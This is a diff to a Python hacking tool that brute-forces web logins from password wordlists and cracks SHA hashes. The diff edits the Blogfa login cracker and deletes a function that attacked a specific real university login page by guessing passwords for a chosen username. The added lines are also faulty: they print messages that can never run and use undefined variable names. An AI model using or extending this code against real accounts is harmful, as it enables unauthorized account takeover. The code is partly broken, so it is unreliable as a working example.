@@ -74,37 +74,21 @@ def blogfaCracker():
             data = str(c)
             if error not in data:
                 print(f.GREEN + " [/] " + f.WHITE + "password is -> " , passwd)
-                break
+                sys.exit()
+            elif erorr not in data:
+                print(f.GREEN + " [/] " + f.WHITE + "password is -> " , passwd)
+                sys.exit()
+            elif eror not in data:
+                print(f.GREEN + " [/] " + f.WHITE + "password is -> " , passwd)
+                sys.exit()
             else: 
                 continue
+            
+            print(f"{RED} [x] {WHITE}Password not found !")
     except:
         print('')
         print(" [-] please check your internet or URL or username")
 
-def admin_pageCracker():
-    def here_banner():
-        a = figlet_format('admin site cracker')
-        print(f.YELLOW + a)
-    here_banner()
-    login = "https://cs.mtech.edu/institute/login.php"
-    URL = req.get(login)
-    info = URL.text
-    information = BeautifulSoup(info , 'html.parser')
-    mreza = information.find('input')['value']
-    error = "Invalid username!"
-    userne = input(f.GREEN + " [?] " + f.BLUE+"Enter username : ")
-    passwords_list = open("nam2elist.txt" , "r").read().split()
-    for passwd in passwords_list:
-        payload = {"_tt":mreza,"username":userne,"password":passwd,"submitBtnLogin":"Login"}
-        mrz = req.post(URL , data = payload)
-        rqPost = mrz.text
-        blog = BeautifulSoup(rqPost, 'html.parser')
-        c = blog.find_all('i')
-        data = str(c)
-        if error not in data:
-            print(f.GREEN + " [/] " + f.WHITE + "password is -> " , passwd)
-        else: 
-            continue
 
 def Hash_cracker():
     
@@ -147,6 +131,9 @@ def Hash_cracker():
                 break
             else:
                 continue
+            
+            print(f"{RED} [x] {WHITE}Password not found !")
+
         
     def sha1a():
         Hash = input(RED + " [*] " + WHITE + "Your hash [ENTER] : ")
@@ -166,6 +153,9 @@ def Hash_cracker():
                 break
             else:
                 continue
+            
+            print(f"{RED} [x] {WHITE}Password not found !")
+        
 
     def sha224a():
         Hash = input(RED + " [*] " + WHITE + "Your hash [ENTER] : ")
@@ -185,6 +175,7 @@ def Hash_cracker():
                 break
             else:
                 continue
+            print(f"{RED} [x] {WHITE}Password not found !")
 
     def sha384a():
         Hash = input(RED + " [*] " + WHITE + "Your hash [ENTER] : ")
@@ -204,6 +195,7 @@ def Hash_cracker():
                 break
             else:
                 continue
+            print(f"{RED} [x] {WHITE}Password not found !")
 
     def sha512a():
         Hash = input(RED + " [*] " + WHITE + "Your hash [ENTER] : ")
@@ -224,6 +216,8 @@ def Hash_cracker():
                 break
             else:
                 continue
+            
+            print(f"{RED} [x] {WHITE}Password not found !")
 
 
     if algorithm == '1':
